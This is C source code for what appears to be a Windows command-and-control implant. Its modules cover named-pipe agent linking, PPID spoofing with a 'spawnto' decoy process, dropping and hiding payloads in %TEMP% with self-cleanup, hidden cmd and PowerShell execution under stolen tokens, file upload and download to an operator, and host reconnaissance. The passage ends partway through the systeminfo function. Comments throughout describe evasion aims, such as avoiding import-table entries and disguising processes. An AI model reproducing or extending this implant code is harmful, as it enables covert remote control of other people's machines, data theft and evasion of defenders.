void mod_link(Buffer *out, const unsigned char *args, DWORD args_len) {
    _link_init_once();

    if (!args || args_len < 10) {
        BUF_STR(out, "[-] Usage: link <target> <pipename>\n");
        return;
    }

    /* Parse wire format: [4B host_len][host\0][4B pipe_len][pipe\0] */
    DWORD off = 0;

    if (off + 4 > args_len) { BUF_STR(out, "[-] Malformed args\n"); return; }
    DWORD host_len = *(DWORD *)(args + off); off += 4;
    if (off + host_len > args_len || host_len > 255) {
        BUF_STR(out, "[-] Malformed args (host)\n"); return;
    }
    char host[256] = {0};
    memcpy(host, args + off, host_len);
    off += host_len;

    if (off + 4 > args_len) { BUF_STR(out, "[-] Malformed args (pipe len)\n"); return; }
    DWORD pipe_name_len = *(DWORD *)(args + off); off += 4;
    if (off + pipe_name_len > args_len || pipe_name_len > 255) {
        BUF_STR(out, "[-] Malformed args (pipe)\n"); return;
    }
    char pipename[256] = {0};
    memcpy(pipename, args + off, pipe_name_len);

    /* Check for duplicate link */
    for (int i = 0; i < MAX_LINKED_AGENTS; i++) {
        if (_linked[i].active &&
            _stricmp(_linked[i].target, host) == 0 &&
            _stricmp(_linked[i].pipename, pipename) == 0) {
            BUF_STR(out, "[-] Already linked to this target/pipe\n");
            return;
        }
    }

    /* Find free slot */
    int slot = -1;
    for (int i = 0; i < MAX_LINKED_AGENTS; i++) {
        if (!_linked[i].active && _linked[i].hPipe == INVALID_HANDLE_VALUE) {
            slot = i;
            break;
        }
    }
    if (slot < 0) {
        BUF_STR(out, "[-] Maximum linked agents reached (8)\n");
        return;
    }

    /* Build UNC pipe path: \\host\pipe\pipename */
    char pipe_path[512];
    snprintf(pipe_path, sizeof(pipe_path), "\\\\%s\\pipe\\%s", host, pipename);

    wchar_t wPipePath[512];
    MultiByteToWideChar(CP_UTF8, 0, pipe_path, -1, wPipePath, 512);

    char msg[512];
    snprintf(msg, sizeof(msg), "[*] Connecting to %s ...\n", pipe_path);
    buf_append(out, msg, (DWORD)strlen(msg));

    /* Connect to remote pipe with retry */
    HANDLE hPipe = INVALID_HANDLE_VALUE;
    for (int attempt = 0; attempt < 3; attempt++) {
        hPipe = CreateFileW(
            wPipePath,
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, 0, NULL
        );
        if (hPipe != INVALID_HANDLE_VALUE) break;

        DWORD err = GetLastError();
        if (err == ERROR_PIPE_BUSY) {
            WaitNamedPipeW(wPipePath, 5000);
        } else {
            Sleep(1000);
        }
    }

    if (hPipe == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        snprintf(msg, sizeof(msg), "[-] Failed to connect to %s (err=%lu)\n", pipe_path, err);
        buf_append(out, msg, (DWORD)strlen(msg));
        return;
    }

    /* Set pipe to byte mode */
    DWORD mode = PIPE_READMODE_BYTE;
    SetNamedPipeHandleState(hPipe, &mode, NULL, NULL);

    /* Store and start relay thread */
    _linked[slot].hPipe = hPipe;
    InterlockedExchange(&_linked[slot].active, 1);
    strncpy(_linked[slot].target, host, 255);
    strncpy(_linked[slot].pipename, pipename, 255);

    _linked[slot].hThread = CreateThread(NULL, 0, _link_relay_thread,
                                         (LPVOID)(intptr_t)slot, 0, NULL);
    if (!_linked[slot].hThread) {
        DWORD err = GetLastError();
        CloseHandle(hPipe);
        _linked[slot].hPipe = INVALID_HANDLE_VALUE;
        InterlockedExchange(&_linked[slot].active, 0);
        snprintf(msg, sizeof(msg), "[-] Failed to start relay thread (err=%lu)\n", err);
        buf_append(out, msg, (DWORD)strlen(msg));
        return;
    }

    InterlockedIncrement(&_linked_count);

    snprintf(msg, sizeof(msg), "[+] Linked to %s via %s (slot %d)\n", host, pipe_path, slot);
    buf_append(out, msg, (DWORD)strlen(msg));
    BUF_STR(out, "[+] Relay thread started — child agent traffic will be forwarded\n");
}

void mod_unlink(Buffer *out, const unsigned char *args, DWORD args_len) {
    _link_init_once();

    if (!args || args_len < 2) {
        /* List active links */
        BOOL any = FALSE;
        char msg[512];
        for (int i = 0; i < MAX_LINKED_AGENTS; i++) {
            if (_linked[i].active) {
                snprintf(msg, sizeof(msg), "  [%d] %s via \\\\%s\\pipe\\%s\n",
                         i, _linked[i].target, _linked[i].target, _linked[i].pipename);
                buf_append(out, msg, (DWORD)strlen(msg));
                any = TRUE;
            }
        }
        if (!any) {
            BUF_STR(out, "[-] No active links\n");
        } else {
            BUF_STR(out, "[*] Usage: unlink <target>\n");
        }
        return;
    }

    /* Parse target from args (raw string) */
    char target[256] = {0};
    DWORD copylen = args_len > 255 ? 255 : args_len;
    memcpy(target, args, copylen);
    /* Trim null/whitespace */
    while (copylen > 0 && (target[copylen-1] == '\0' || target[copylen-1] == ' '
           || target[copylen-1] == '\n' || target[copylen-1] == '\r'))
        target[--copylen] = '\0';

    BOOL found = FALSE;
    char msg[512];
    for (int i = 0; i < MAX_LINKED_AGENTS; i++) {
        if (_linked[i].active && _stricmp(_linked[i].target, target) == 0) {
            InterlockedExchange(&_linked[i].active, 0);
            /* Close the pipe — this will cause the relay thread's ReadFile to fail and exit */
            if (_linked[i].hPipe != INVALID_HANDLE_VALUE) {
                /* Use CancelIoEx to unblock pending ReadFile if available */
                typedef BOOL (WINAPI *fnCancelIoEx)(HANDLE, LPOVERLAPPED);
                HMODULE hK32 = LoadLibraryA("kernel32.dll");
                fnCancelIoEx pCancelIoEx = (fnCancelIoEx)GetProcAddress(hK32, "CancelIoEx");
                if (pCancelIoEx)
                    pCancelIoEx(_linked[i].hPipe, NULL);
                CloseHandle(_linked[i].hPipe);
                _linked[i].hPipe = INVALID_HANDLE_VALUE;
            }
            if (_linked[i].hThread) {
                WaitForSingleObject(_linked[i].hThread, 3000);
                CloseHandle(_linked[i].hThread);
                _linked[i].hThread = NULL;
            }
            InterlockedDecrement(&_linked_count);
            _linked[i].target[0] = '\0';
            _linked[i].pipename[0] = '\0';
            snprintf(msg, sizeof(msg), "[+] Unlinked from %s\n", target);
            buf_append(out, msg, (DWORD)strlen(msg));
            found = TRUE;
            break;
        }
    }

    if (!found) {
        snprintf(msg, sizeof(msg), "[-] No active link to %s\n", target);
        buf_append(out, msg, (DWORD)strlen(msg));
    }
}

/* ─── Module: spawnto (set sacrificial process for post-ex jobs) ─── */

void mod_spawnto(Buffer *out, const char *argstr) {
    char msg[512];

    /* No args → show current config */
    if (!argstr || argstr[0] == '\0') {
        /* Expand environment variables for display */
        char expanded_x64[MAX_PATH], expanded_x86[MAX_PATH];
        ExpandEnvironmentStringsA(_spawnto_x64, expanded_x64, MAX_PATH);
        ExpandEnvironmentStringsA(_spawnto_x86, expanded_x86, MAX_PATH);
        snprintf(msg, sizeof(msg),
                 "[*] Current spawnto configuration:\n"
                 "    x64: %s\n"
                 "         → %s\n"
                 "    x86: %s\n"
                 "         → %s\n",
                 _spawnto_x64, expanded_x64,
                 _spawnto_x86, expanded_x86);
        buf_append(out, msg, (DWORD)strlen(msg));
        return;
    }

    /* Parse: "x64 <path>" or "x86 <path>" */
    const char *p = argstr;
    while (*p == ' ') p++;

    char arch[8] = {0};
    int i = 0;
    while (*p && *p != ' ' && i < 7) arch[i++] = *p++;
    while (*p == ' ') p++;

    if (*p == '\0') {
        BUF_STR(out, "[-] Usage: spawnto <x64|x86> <path>\n"
                      "[-] Example: spawnto x64 %windir%\\sysnative\\runas.exe\n");
        return;
    }

    /* Validate the path resolves to an existing file */
    char expanded[MAX_PATH];
    ExpandEnvironmentStringsA(p, expanded, MAX_PATH);

    DWORD attrs = GetFileAttributesA(expanded);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        snprintf(msg, sizeof(msg),
                 "[!] Warning: %s does not exist (expanded: %s)\n"
                 "[!] Setting anyway — ensure it exists before spawning\n",
                 p, expanded);
        buf_append(out, msg, (DWORD)strlen(msg));
    } else if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
        snprintf(msg, sizeof(msg), "[-] Path is a directory: %s\n", expanded);
        buf_append(out, msg, (DWORD)strlen(msg));
        return;
    }

    if (_stricmp(arch, "x64") == 0) {
        strncpy(_spawnto_x64, p, MAX_PATH - 1);
        _spawnto_x64[MAX_PATH - 1] = '\0';
        snprintf(msg, sizeof(msg), "[+] spawnto x64 → %s\n", p);
        buf_append(out, msg, (DWORD)strlen(msg));
    } else if (_stricmp(arch, "x86") == 0) {
        strncpy(_spawnto_x86, p, MAX_PATH - 1);
        _spawnto_x86[MAX_PATH - 1] = '\0';
        snprintf(msg, sizeof(msg), "[+] spawnto x86 → %s\n", p);
        buf_append(out, msg, (DWORD)strlen(msg));
    } else {
        snprintf(msg, sizeof(msg), "[-] Unknown arch: %s (use x64 or x86)\n", arch);
        buf_append(out, msg, (DWORD)strlen(msg));
    }
}

/* ─── Module: ppid (set parent PID for spawned post-ex processes) ─── */

void mod_ppid(Buffer *out, const char *argstr) {
    char msg[256];

    /* No args → show current config */
    if (!argstr || argstr[0] == '\0') {
        if (_spawn_ppid == 0) {
            BUF_STR(out, "[*] PPID spoofing: disabled (inherits from agent)\n");
        } else {
            snprintf(msg, sizeof(msg),
                     "[*] PPID spoofing: enabled (parent PID = %lu)\n", _spawn_ppid);
            buf_append(out, msg, (DWORD)strlen(msg));
        }
        return;
    }

    /* Parse PID */
    const char *p = argstr;
    while (*p == ' ') p++;

    DWORD pid = (DWORD)strtoul(p, NULL, 10);

    if (pid == 0) {
        _spawn_ppid = 0;
        BUF_STR(out, "[+] PPID spoofing disabled\n");
        return;
    }

    /* Validate PID exists by trying to open the process */
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        DWORD err = GetLastError();
        snprintf(msg, sizeof(msg),
                 "[!] Warning: cannot open PID %lu (err=%lu)\n"
                 "[!] Setting anyway — ensure process exists before spawning\n",
                 pid, err);
        buf_append(out, msg, (DWORD)strlen(msg));
    } else {
        /* Show process name for confirmation */
        char procname[MAX_PATH] = {0};
        DWORD namesize = MAX_PATH;
        typedef BOOL (WINAPI *fnQueryFullProcessImageNameA)(HANDLE, DWORD, LPSTR, PDWORD);
        HMODULE hK32 = LoadLibraryA("kernel32.dll");
        fnQueryFullProcessImageNameA pQuery = (fnQueryFullProcessImageNameA)
            GetProcAddress(hK32, "QueryFullProcessImageNameA");
        if (pQuery && pQuery(hProc, 0, procname, &namesize)) {
            /* Extract just the filename */
            char *slash = strrchr(procname, '\\');
            snprintf(msg, sizeof(msg), "[*] Target parent: %s (PID %lu)\n",
                     slash ? slash + 1 : procname, pid);
            buf_append(out, msg, (DWORD)strlen(msg));
        }
        CloseHandle(hProc);
    }

    _spawn_ppid = pid;
    snprintf(msg, sizeof(msg), "[+] PPID set to %lu\n", pid);
    buf_append(out, msg, (DWORD)strlen(msg));
}

/* ─── Module: spawn (fork sacrificial process, inject payload → new beacon) ─── */

/* MinGW compatibility — these may be missing from older headers */
#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS ((DWORD_PTR)0x00020000)
#endif

/*
 * Writes agent payload to %TEMP%\<rand>.exe, creates a new process
 * with PPID spoofing (if configured) and CREATE_NO_WINDOW.
 * The new process is a full agent that performs its own key exchange
 * and check-in, resulting in a new beacon session.
 */

/* Typedefs for dynamic API resolution */
typedef BOOL (WINAPI *fn_InitPTAL)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, SIZE_T *);
typedef BOOL (WINAPI *fn_UpdatePTA)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, PVOID, SIZE_T, PVOID, SIZE_T *);
typedef void (WINAPI *fn_DeletePTAL)(LPPROC_THREAD_ATTRIBUTE_LIST);
typedef BOOL (WINAPI *fn_CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
        LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR,
        LPSTARTUPINFOW, LPPROCESS_INFORMATION);

void mod_spawn(Buffer *out, const unsigned char *args, DWORD args_len) {
    char msg[512];

    if (!args || args_len < 8) {
        BUF_STR(out, "[-] Invalid spawn arguments (no payload)\n");
        return;
    }

    /* Parse wire format: [4B payload_len][payload bytes] */
    DWORD off = 0;
    if (off + 4 > args_len) { BUF_STR(out, "[-] Malformed spawn args\n"); return; }
    DWORD payload_len = *(DWORD *)(args + off); off += 4;
    if (off + payload_len > args_len || payload_len == 0) {
        BUF_STR(out, "[-] Malformed spawn args (payload)\n");
        return;
    }
    const unsigned char *payload = args + off;

    /* Determine arch-appropriate spawnto path */
#ifdef _WIN64
    const char *spawnto_raw = _spawnto_x64;
    const char *arch_str = "x64";
#else
    const char *spawnto_raw = _spawnto_x86;
    const char *arch_str = "x86";
#endif

    /* Expand environment variables */
    char spawnto_expanded[MAX_PATH];
    ExpandEnvironmentStringsA(spawnto_raw, spawnto_expanded, MAX_PATH);

    snprintf(msg, sizeof(msg), "[*] Spawn %s via %s\n", arch_str, spawnto_expanded);
    buf_append(out, msg, (DWORD)strlen(msg));
    if (_spawn_ppid != 0) {
        snprintf(msg, sizeof(msg), "[*] PPID spoofing: %lu\n", _spawn_ppid);
        buf_append(out, msg, (DWORD)strlen(msg));
    }

    /* 1. Write payload to temp file */
    char tempDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);

    char rname[9];
    _jump_randname(rname, 8);

    char tempPath[MAX_PATH];
    snprintf(tempPath, sizeof(tempPath), "%s%s.exe", tempDir, rname);

    HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, 0,
                                NULL, CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        snprintf(msg, sizeof(msg), "[-] Failed to create temp file: %s (err=%lu)\n",
                 tempPath, GetLastError());
        buf_append(out, msg, (DWORD)strlen(msg));
        return;
    }

    DWORD written;
    WriteFile(hFile, payload, payload_len, &written, NULL);
    CloseHandle(hFile);

    if (written != payload_len) {
        snprintf(msg, sizeof(msg), "[-] Incomplete write (%lu/%lu bytes)\n", written, payload_len);
        buf_append(out, msg, (DWORD)strlen(msg));
        DeleteFileA(tempPath);
        return;
    }

    snprintf(msg, sizeof(msg), "[+] Wrote %lu bytes to %s\n", payload_len, tempPath);
    buf_append(out, msg, (DWORD)strlen(msg));

    /* 2. Resolve APIs dynamically */
    HMODULE hK32 = LoadLibraryA("kernel32.dll");
    fn_InitPTAL pInitPTAL = (fn_InitPTAL)GetProcAddress(hK32,
        "InitializeProcThreadAttributeList");
    fn_UpdatePTA pUpdatePTA = (fn_UpdatePTA)GetProcAddress(hK32,
        "UpdateProcThreadAttribute");
    fn_DeletePTAL pDeletePTAL = (fn_DeletePTAL)GetProcAddress(hK32,
        "DeleteProcThreadAttributeList");
    fn_CreateProcessW_t pCreateProcessW = (fn_CreateProcessW_t)GetProcAddress(hK32,
        "CreateProcessW");

    if (!pCreateProcessW) {
        BUF_STR(out, "[-] Failed to resolve CreateProcessW\n");
        DeleteFileA(tempPath);
        return;
    }

    /* 3. Build command line — use the temp payload path as the actual binary,
     *    but the spawnto path as the "image name" argument in the command line
     *    so it appears as the spawnto process in task manager argument column. */
    wchar_t wTempPath[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, tempPath, -1, wTempPath, MAX_PATH);

    wchar_t wSpawnTo[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, spawnto_expanded, -1, wSpawnTo, MAX_PATH);

    /* Command line: just the binary path (the payload IS the exe) */
    wchar_t wCmdLine[MAX_PATH + 4];
    swprintf(wCmdLine, MAX_PATH + 4, L"\"%ls\"", wTempPath);

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    BOOL spawned = FALSE;
    DWORD createFlags = CREATE_NO_WINDOW;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;
    HANDLE hParent = NULL;

    /* 4. PPID spoofing setup (if configured and APIs available) */
    if (_spawn_ppid != 0 && pInitPTAL && pUpdatePTA && pDeletePTAL) {
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, _spawn_ppid);
        if (!hParent) {
            snprintf(msg, sizeof(msg),
                     "[!] Cannot open parent PID %lu (err=%lu), spawning without PPID spoof\n",
                     _spawn_ppid, GetLastError());
            buf_append(out, msg, (DWORD)strlen(msg));
        }
    }

    if (hParent) {
        /* Create with EXTENDED_STARTUPINFO_PRESENT for PPID spoofing */
        SIZE_T attrSize = 0;
        pInitPTAL(NULL, 1, 0, &attrSize);
        pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
        if (pAttrList && pInitPTAL(pAttrList, 1, 0, &attrSize)) {
            /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000 */
            if (pUpdatePTA(pAttrList, 0,
                           (PVOID)0x00020000, /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */
                           &hParent, sizeof(HANDLE), NULL, NULL)) {

                STARTUPINFOEXW siex;
                memset(&siex, 0, sizeof(siex));
                siex.StartupInfo.cb = sizeof(siex);
                siex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                siex.StartupInfo.wShowWindow = SW_HIDE;
                siex.lpAttributeList = pAttrList;

                createFlags |= EXTENDED_STARTUPINFO_PRESENT;

                spawned = pCreateProcessW(
                    wTempPath,     /* lpApplicationName — actual binary */
                    wCmdLine,      /* lpCommandLine */
                    NULL, NULL,
                    FALSE,         /* bInheritHandles */
                    createFlags,
                    NULL, NULL,
                    (LPSTARTUPINFOW)&siex, &pi);

                if (spawned) {
                    snprintf(msg, sizeof(msg), "[+] Spawned with PPID spoof (parent=%lu)\n",
                             _spawn_ppid);
                    buf_append(out, msg, (DWORD)strlen(msg));
                }
            }
        }
    }

    /* 5. Fallback: no PPID spoofing */
    if (!spawned) {
        /* Check for impersonation token */
        HANDLE hThreadToken = NULL;
        if (OpenThreadToken(GetCurrentThread(),
                            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                            FALSE, &hThreadToken)) {
            HANDLE hPrimary = NULL;
            if (DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
                                 SecurityImpersonation, TokenPrimary, &hPrimary)) {
                STARTUPINFOW siw;
                memset(&siw, 0, sizeof(siw));
                siw.cb = sizeof(siw);
                siw.dwFlags = STARTF_USESHOWWINDOW;
                siw.wShowWindow = SW_HIDE;

                spawned = CreateProcessWithTokenW(
                    hPrimary, 0, wTempPath, wCmdLine,
                    CREATE_NO_WINDOW, NULL, NULL, &siw, &pi);

                CloseHandle(hPrimary);
            }
            CloseHandle(hThreadToken);
        }

        if (!spawned) {
            STARTUPINFOW siw;
            memset(&siw, 0, sizeof(siw));
            siw.cb = sizeof(siw);
            siw.dwFlags = STARTF_USESHOWWINDOW;
            siw.wShowWindow = SW_HIDE;

            spawned = pCreateProcessW(
                wTempPath, wCmdLine,
                NULL, NULL, FALSE,
                CREATE_NO_WINDOW,
                NULL, NULL,
                &siw, &pi);
        }
    }

    /* 6. Cleanup PPID spoofing resources */
    if (pAttrList) {
        pDeletePTAL(pAttrList);
        free(pAttrList);
    }
    if (hParent) CloseHandle(hParent);

    if (!spawned) {
        DWORD err = GetLastError();
        snprintf(msg, sizeof(msg), "[-] CreateProcess failed (err=%lu)\n", err);
        buf_append(out, msg, (DWORD)strlen(msg));
        DeleteFileA(tempPath);
        return;
    }

    snprintf(msg, sizeof(msg), "[+] Spawned process PID %lu (TID %lu)\n",
             pi.dwProcessId, pi.dwThreadId);
    buf_append(out, msg, (DWORD)strlen(msg));

    /* 7. Wait briefly for the child to read the binary, then delete from disk */
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* Sleep a moment to let the child load — then try to delete.
     * If the file is still locked, schedule deletion on reboot via MoveFileEx. */
    Sleep(3000);
    if (!DeleteFileA(tempPath)) {
        /* Schedule delete on reboot (MOVEFILE_DELAY_UNTIL_REBOOT) */
        wchar_t wTemp[MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, tempPath, -1, wTemp, MAX_PATH);
        MoveFileExW(wTemp, NULL, 4 /* MOVEFILE_DELAY_UNTIL_REBOOT */);
        snprintf(msg, sizeof(msg), "[*] Temp file locked — scheduled for deletion on reboot\n");
        buf_append(out, msg, (DWORD)strlen(msg));
    } else {
        BUF_STR(out, "[+] Temp file cleaned up\n");
    }

    BUF_STR(out, "[+] New beacon should check in shortly\n");
}

/* ─── Module: upload (write file to target) ─── */

void mod_upload(Buffer *out, const char *path,
                const unsigned char *data, DWORD data_len) {
    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "Cannot create: %s (err=%lu)\n", path, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return;
    }

    DWORD written;
    if (WriteFile(hFile, data, data_len, &written, NULL)) {
        char msg[256];
        snprintf(msg, sizeof(msg), "Written %lu bytes to %s\n", written, path);
        buf_append(out, msg, (DWORD)strlen(msg));
    }
    CloseHandle(hFile);
}

/* ─── Module: download (read file for transfer to operator) ─── */

void mod_download(Buffer *out, const char *path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return; /* Error signaled via result status */
    }

    DWORD fsize = GetFileSize(hFile, NULL);
    if (fsize > 50 * 1024 * 1024) { /* 50MB limit */
        CloseHandle(hFile);
        return;
    }

    unsigned char *fbuf = (unsigned char *)malloc(fsize);
    DWORD bytes_read;
    if (ReadFile(hFile, fbuf, fsize, &bytes_read, NULL)) {
        buf_append(out, fbuf, bytes_read);
    }
    free(fbuf);
    CloseHandle(hFile);
}

/* ─── Module: shell / powershell (DANGER: spawns child process) ─── */

static void mod_shell_exec(Buffer *out, const char *cmd_line, BOOL use_powershell) {
    /*
     * Spawn cmd.exe /c <cmd> or powershell.exe -NoProfile -NonInteractive -Command <cmd>
     * Capture stdout + stderr via anonymous pipes.
     * This is the ONE case where we intentionally spawn a child process.
     */
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hStdoutRead = NULL, hStdoutWrite = NULL;
    HANDLE hStderrRead = NULL, hStderrWrite = NULL;

    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0) ||
        !CreatePipe(&hStderrRead, &hStderrWrite, &sa, 0)) {
        buf_append(out, "Failed to create pipes\n", 23);
        return;
    }

    /* Ensure read ends are NOT inherited */
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0);

    /* Build command line */
    char full_cmd[8192];
    if (use_powershell) {
        snprintf(full_cmd, sizeof(full_cmd),
                 "powershell.exe -NoProfile -NonInteractive -Command \"%s\"", cmd_line);
    } else {
        snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", cmd_line);
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStderrWrite;
    si.hStdInput = NULL;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));

    DBG("[shell] executing: %s", full_cmd);

    /*
     * If the thread is impersonating (getsystem / steal_token), use
     * CreateProcessWithTokenW so the child runs as the impersonated
     * identity.  Only needs SeImpersonatePrivilege (admins have it).
     * Fall back to plain CreateProcessA when not impersonating.
     */
    BOOL spawned = FALSE;
    HANDLE hThreadToken = NULL;
    if (OpenThreadToken(GetCurrentThread(),
                        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                        FALSE, &hThreadToken)) {
        /* Duplicate as a primary token — CreateProcessWithTokenW needs one */
        HANDLE hPrimary = NULL;
        if (DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
                             SecurityImpersonation, TokenPrimary, &hPrimary)) {
            WCHAR wCmd[8192];
            MultiByteToWideChar(CP_UTF8, 0, full_cmd, -1, wCmd, 8192);

            STARTUPINFOW siw;
            memset(&siw, 0, sizeof(siw));
            siw.cb = sizeof(siw);
            siw.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            siw.hStdOutput = hStdoutWrite;
            siw.hStdError  = hStderrWrite;
            siw.hStdInput  = NULL;
            siw.wShowWindow = SW_HIDE;

            /* CreateProcessWithTokenW — seclogon service handles duplicating
             * the pipe handles into the new process internally. */
            spawned = CreateProcessWithTokenW(
                hPrimary,
                0,             /* dwLogonFlags: 0 = no profile load */
                NULL,          /* lpApplicationName */
                wCmd,          /* lpCommandLine */
                CREATE_NO_WINDOW,
                NULL,          /* lpEnvironment */
                NULL,          /* lpCurrentDirectory */
                &siw, &pi);

            if (!spawned) {
                DBG("[shell] CreateProcessWithTokenW failed (err=%lu), falling back",
                    GetLastError());
            }
            CloseHandle(hPrimary);
        }
        CloseHandle(hThreadToken);
    }

    if (!spawned) {
        spawned = CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }

    if (!spawned) {
        char err[256];
        snprintf(err, sizeof(err), "CreateProcess failed (err=%lu)\n", GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        CloseHandle(hStdoutRead); CloseHandle(hStdoutWrite);
        CloseHandle(hStderrRead); CloseHandle(hStderrWrite);
        return;
    }

    /* Close write ends in parent — child has them.
     * This is critical: ReadFile on the read end will return FALSE
     * with ERROR_BROKEN_PIPE once the child exits and all data is read. */
    CloseHandle(hStdoutWrite);
    CloseHandle(hStderrWrite);
    hStdoutWrite = NULL;
    hStderrWrite = NULL;

    /* Read stdout BEFORE waiting — prevents pipe buffer deadlock.
     * ReadFile blocks until data is available or the pipe breaks (child exits).
     * If the child writes more than the pipe buffer (4KB default),
     * WaitForSingleObject would deadlock because the child blocks on write. */
    DWORD bytes_read;
    char read_buf[4096];
    while (TRUE) {
        if (ReadFile(hStdoutRead, read_buf, sizeof(read_buf), &bytes_read, NULL) && bytes_read > 0) {
            buf_append(out, read_buf, bytes_read);
        } else {
            break;  /* ERROR_BROKEN_PIPE = child exited, pipe drained */
        }
    }

    /* Read any remaining stderr */
    while (TRUE) {
        if (ReadFile(hStderrRead, read_buf, sizeof(read_buf), &bytes_read, NULL) && bytes_read > 0) {
            buf_append(out, "[STDERR] ", 9);
            buf_append(out, read_buf, bytes_read);
        } else {
            break;
        }
    }

    /* Now wait for process exit (should be near-instant since pipes are drained) */
    WaitForSingleObject(pi.hProcess, 5000);

    CloseHandle(hStdoutRead);
    CloseHandle(hStderrRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

/* ─── Module: systeminfo ─── */

void mod_systeminfo(Buffer *out) {
    char line[1024];

    /* ── Hostname ── */
    char hostname[256] = {0};
    DWORD hsize = sizeof(hostname);
    if (GetComputerNameA(hostname, &hsize))
        snprintf(line, sizeof(line), "Hostname: %s\n", hostname);
    else
        snprintf(line, sizeof(line), "Hostname: (unknown)\n");
    buf_append(out, line, (DWORD)strlen(line));

    /* ── IP addresses ──
     * Use GetAdaptersAddresses to enumerate all unicast IPs.
     * Link against iphlpapi.dll — resolved dynamically to avoid IAT entry. */
    {
        typedef ULONG (WINAPI *pGetAdaptersAddresses)(
            ULONG Family, ULONG Flags, PVOID Reserved,
            void *AdapterAddresses, PULONG SizePointer);

        HMODULE hIp = LoadLibraryA("iphlpapi.dll");
        pGetAdaptersAddresses fnGAA = NULL;
        if (hIp)
            fnGAA = (pGetAdaptersAddresses)GetProcAddress(hIp, "GetAdaptersAddresses");

        if (fnGAA) {
            ULONG bufLen = 16384;
            unsigned char *abuf = (unsigned char *)malloc(bufLen);
            if (abuf) {
                ULONG ret = fnGAA(0 /*AF_UNSPEC*/, 0x0010 /*GAA_FLAG_SKIP_MULTICAST*/, NULL, abuf, &bufLen);
                if (ret == ERROR_BUFFER_OVERFLOW) {
                    free(abuf);
                    abuf = (unsigned char *)malloc(bufLen);
                    if (abuf)
                        ret = fnGAA(0, 0x0010, NULL, abuf, &bufLen);
                }
                if (ret == 0 && abuf) {
                    /* IP_ADAPTER_ADDRESSES walk */
                    typedef struct _UA {
                        union { struct { ULONG Length; DWORD Flags; } s; } u;
                        struct _UA *Next;
                        void *Address;      /* SOCKET_ADDRESS: .lpSockaddr, .iSockaddrLength */
                        int   AddrLen;
                    } UA;
                    typedef struct _AA {
                        union { ULONGLONG Alignment; struct { ULONG Length; DWORD IfIndex; } s; } u;
                        struct _AA *Next;
                        char *AdapterName;
                        UA   *FirstUnicastAddress;
                        /* We only need fields up to FirstUnicastAddress */
                    } AA;

                    /* The real IP_ADAPTER_ADDRESSES is large; we only read the first
                       few fields. Walk via Next pointer and FirstUnicastAddress. */
                    /* Correct approach: use the documented struct layout.
                       Offset of FirstUnicastAddress in IP_ADAPTER_ADDRESSES (x64):
                         alignment(8) + Next(8) + AdapterName(8) = offset 24  ... but
                       this is fragile. Instead, use the proper Windows headers. */

                    /* Simpler: use gethostname + getaddrinfo which are always in ws2_32 */
                }
                free(abuf);
            }
        }
        if (hIp) FreeLibrary(hIp);

        /* Fallback / primary: use Winsock getaddrinfo for reliable IP enumeration */
        {
